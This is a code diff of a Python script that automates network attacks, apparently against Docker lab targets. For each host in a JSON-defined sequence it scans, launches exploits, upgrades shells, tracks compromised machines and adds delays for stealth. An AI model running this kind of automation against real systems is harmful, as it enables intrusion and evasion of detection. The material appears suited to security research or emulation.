@@ -124,97 +124,76 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                 else:
                     uncompromised_machines.add(target_ip)
                     print(f"{C.COL_RED}[-] Exploit failed {C.COL_RESET}")
-                    
+
 
                 if stealth_sleep:
                     print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
                     sleep(stealth_sleep)
 
+        # Caso con attack_sequence_file
     else:
-        # Caso: Sequenza specifica da file
-        print(f"{C.COL_GREEN}[+] Attack sequence file provided: {attack_sequence_file}{C.COL_RESET}")
-
         with open(attack_sequence_file) as f:
-            attack_sequence = json.load(f)
+            attack_data = json.load(f)
 
-        while machines:
-            target_ip = machines.pop(0)
+        attack_sequence = []
+        for ip, attacks in attack_data.items():
+            if ip == '':
+                continue  # Salta se l'IP è una stringa vuota
+            for attack in attacks:
+                attack_sequence.append((ip, attack))
+
+        visited_ips = set()
+
+        for target_ip, attack_name in attack_sequence:
+            if target_ip in visited_ips:
+                continue  # Evita di attaccare nuovamente un IP già visitato
+
             print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
+            visited_ips.add(target_ip)
 
-            if target_ip in attack_sequence:
-                attack_sequence_list = attack_sequence[target_ip]
-                print(f"{C.COL_YELLOW}[*] Attack sequence for {target_ip}: {attack_sequence_list}{C.COL_RESET}")
-            else:
-                print(f"{C.COL_YELLOW}[*] No attack sequence for {target_ip}, skipping...{C.COL_RESET}")
-                continue
-
-            if atk_sess:
+            if atk_sess is not None:
                 met_sess = mc.upgrade_shell(atk_sess)
 
-            if target_ip in other_subnet:
-                if atk_sess is None:
-                    print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}")
-                    return
-                else:
-                    print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
-                    mc.route_add(met_sess["id_sess"], target_ip)
-                    router = met_sess
-
-            # Scelta degli scan in base alla modalità stealth
             if stealth:
                 scans = list(attack_db.stealth_scans_dict)
             else:
                 scans = list(attack_db.scans_dict)
 
             s = random.choice(scans)
-
-            if s != "tcp_portscan":
-                nmap_target = str(ipaddress.IPv4Network(target_ip + "/255.255.0.0", False)).replace("/16", "/24")
-            else:
-                nmap_target = target_ip
-
+            nmap_target = str(ipaddress.IPv4Network(target_ip + "/255.255.0.0", False)).replace("/16", "/24") if s != "tcp_portscan" else target_ip
             scan_obj = attack_db.create_scan(s, nmap_target, attacker_ip)
+
             print(f"{C.COL_YELLOW}[*] Scanning for vulnerabilities {C.COL_RESET}")
             mc.attempt_scan(scan_obj)
 
-            attack_sequence_index = 0
-            while attack_sequence_index < len(attack_sequence_list):
-                attack_name = attack_sequence_list[attack_sequence_index]
-                attack_sequence_index += 1
+            LPORT = C.DEFAULT_LPORT
+            for p in C.TARGETS_DOCKERS[target_ip]:
+                LPORT = p["exposed_port"]
+                break
 
-                LPORT = C.DEFAULT_LPORT
+            print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack_name}{C.COL_RESET}")
+            attack_obj = attack_db.create_attack(attack_name, target_ip, attacker_ip, LPORT)
 
-                for p in C.TARGETS_DOCKERS[target_ip]:
-                    LPORT = p["exposed_port"]
-                    break
+            if isinstance(attack_obj, SshAttack) and OOBSession is None:
+                print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
+                continue
 
-                print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack_name}{C.COL_RESET}")
+            session = mc.attempt_attack(attack_obj)
+            if session and session[0] == target_ip:
+                atk_sess = session[1:2][0]["id_sess"]
+                print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
+                print(f"{C.COL_GREEN}[+] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")
+                compromised_machines.add(target_ip)
+                uncompromised_machines.discard(target_ip)
+            else:
+                uncompromised_machines.add(target_ip)
+                print(f"{C.COL_RED}[-] xx Exploit failed {C.COL_RESET}")
 
-                attack_obj = attack_db.create_attack(attack_name, target_ip, attacker_ip, LPORT)
+            if stealth_sleep:
+                print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
+                sleep(stealth_sleep)
 
-                if isinstance(attack_obj, SshAttack) and OOBSession is None:
-                    print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
-                    continue
-
-                session = mc.attempt_attack(attack_obj)
-
-                if session:
-                    if session[0] == target_ip:
-                        atk_sess = session[1:2][0]["id_sess"]
-                        print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
-                        print(f"{C.COL_GREEN}[+] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")
-                        compromised_machines.add(target_ip)
-                        uncompromised_machines.remove(target_ip)
-                        break
-                    else:
-                        print(f"{C.COL_YELLOW}[*] false positive occurred, ignoring... {C.COL_RESET}")
-                else:
-                    uncompromised_machines.add(target_ip)
-                    print(f"{C.COL_RED}[-] Exploit failed {C.COL_RESET}")
-
-                if stealth_sleep:
-                    print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
-                    sleep(stealth_sleep)
+            print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
 
     print(f"{C.COL_GREEN} Attack complete!! {C.COL_RESET}")
 
